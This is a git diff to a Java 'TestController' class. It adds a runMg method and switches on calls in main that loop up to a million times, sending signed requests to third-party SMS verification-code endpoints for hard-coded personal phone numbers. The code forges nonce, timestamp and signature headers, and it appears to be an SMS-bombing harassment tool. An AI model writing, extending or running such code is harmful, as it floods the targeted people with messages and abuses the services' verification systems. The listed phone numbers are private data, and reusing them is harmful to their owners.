@@ -245,23 +245,28 @@ public class TestController {
     }*/
 
     public static void main(String[] args) throws IOException {
+
+
         //sendSMS("15708431920");
 
         TestController controller =  new TestController();
-        //controller.runTD("17780677777", 1000, 2000);
+        controller.runTD("17780677777", 1000000, 2000);
+        //controller.runTD("15708431920", 1000000, 2000);
 
-        //controller.runGG("17780677777", 1000, 2000);
+
+        //controller.runGG("17780677777", 1000000, 2000);
         controller.runMm("17780677777", 100, 70000);
+        controller.run("17780677777", 100, 70000);
 
-        //controller.runTD("15708431920", 1000, 2000);
+        //controller.runTD("13810707147", 1000000, 2000);
 
-       //controller.runGG("15708431920", 1000, 2000);
-      //controller.run("15846254785", 100, 70000);
+       //controller.runMg( 1000000, 2000);
+       // controller.runMm("13810707147", 100, 70000);*/
+      //controller.run("15708431920", 100, 70000);
 
         //controller.runTD("17780677777", 1000, 70000);
         //controller.runTD("15708431920", 1000, 70000);
-
-        //controller.runGG("17780677777", 100, 1000);
+        controller.runGG("17780677777", 100, 1000);
 
         //controller.runGG("15708431920", 100, 1000);
 
@@ -337,6 +342,80 @@ public class TestController {
                 }
             }
         }).start();
+    }
+
+    public  void runMg( Integer num, Integer sleep) throws IOException {
+
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                for (int i=0 ; i<num ; i++) {
+                    String phone = "15708431922";
+
+                    String token = UUID.randomUUID().toString();
+
+                    String title = UUID.randomUUID().toString();
+
+                    //把参数传进Map中
+                    HashMap<String,String> params=new HashMap<>();
+                    //params.put("codeType","2");
+                    params.put("mobilePhone","+86-"+ phone);
+                    //params.put("title",title);
+                    params.put("token",token);
+                    //params.put("userName",phone);
+                    FormBody.Builder builder = new FormBody.Builder();
+                    for (String key : params.keySet()) {
+                        //追加表单信息
+                        builder.add(key, params.get(key));
+                    }
+
+
+                    String noce = UUID.randomUUID().toString().replaceAll("-","");
+
+                    String timestamp = System.currentTimeMillis() + "";
+
+
+                    String body = "{mobilePhone:\""+ phone +"\",token:\""+ token +"\"}";
+
+                    OkHttpClient okHttpClient=new OkHttpClient();
+
+                    RequestBody formBody = RequestBody.create(MediaType.parse(body), body);
+
+                    Request request=new Request.Builder().url("https://gateway.ca-b2b.com/ca-user-provider/mobile/source-open/sendPhoneCode")
+                            .addHeader("url","ca-user-provider/mobile/source-open/sendPhoneCode")
+                            .addHeader("nonce",noce)
+                            .addHeader("timestamp", timestamp)
+                            .addHeader("sign",getSign("ca-user-provider/mobile/source-open/sendPhoneCode", body,noce, timestamp))
+                            .addHeader("Content-Type","application/json;charset=UTF-8")
+                            .post(formBody).build();
+
+
+
+                    Call call=okHttpClient.newCall(request);
+                    call.enqueue(new Callback() {
+                        @Override
+                        public void onFailure(Call call, IOException e) {
+                            //请求失败的处理
+                        }
+                        @Override
+                        public void onResponse(Call call, Response response) throws IOException {
+
+                            System.out.println(response.body().string());
+                        }
+                    });
+
+
+                    try {
+                        Thread.sleep(sleep);
+                    } catch (InterruptedException e) {
+                        e.printStackTrace();
+                    }
+
+                }
+            }
+        }).start();
+
+
     }
 
     public  void run(String phone, Integer num, Integer sleep) throws IOException {
